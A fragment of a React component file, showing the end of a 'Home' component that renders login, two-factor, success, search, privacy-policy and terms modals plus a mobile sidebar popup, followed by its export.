            <LoginModal show={showLoginModal} onClose={() => setShowLoginModal(false)} onSubmit={handleLoginSubmit} onSuccess={() => { setShowLoginModal(false); setShow2FAModal(true); }} texts={texts} />
            <TwoFAModal show={show2FAModal} onClose={() => setShow2FAModal(false)} onSubmit={handle2FASubmit} onSuccess={() => { setShow2FAModal(false); setShowSuccessModal(true); }} texts={texts} />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
            <SearchModal show={showSearchModal} onClose={() => setShowSearchModal(false)} texts={texts} />
            <PrivacyPolicyModal
                show={showPrivacyModal}
                onClose={() => {
                    setShowPrivacyModal(false);
                    setSelectedPrivacyQuestion(null);
                }}
                selectedQuestion={selectedPrivacyQuestion}
                texts={texts}
            />
            <TermsModal show={showTermsModal} onClose={() => setShowTermsModal(false)} texts={texts} />

            {showMobileSidebar && (
                <div className="popup show" id="popup" onClick={() => setShowMobileSidebar(false)} style={{ display: 'block' }}>
                    <div className="popup-item" onClick={(e) => e.stopPropagation()}>
                        <div className="burger-button-popup" id="closePopup" onClick={() => setShowMobileSidebar(false)} style={{ cursor: 'pointer' }}>
                            <div className="bar"></div>
                            <div className="bar"></div>
                        </div>
                        <div className="popup-content">
                            <Sidebar
                                texts={texts}
                                onOpenSearchModal={() => {
                                    setShowMobileSidebar(false);
                                    setShowSearchModal(true);
                                }}
                                onOpenPrivacyModal={(question) => {
                                    setShowMobileSidebar(false);
                                    setSelectedPrivacyQuestion(question);
                                    setShowPrivacyModal(true);
                                }}
                                onOpenTermsModal={() => {
                                    setShowMobileSidebar(false);
                                    setShowTermsModal(true);
                                }}
                            />
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

export default Home;

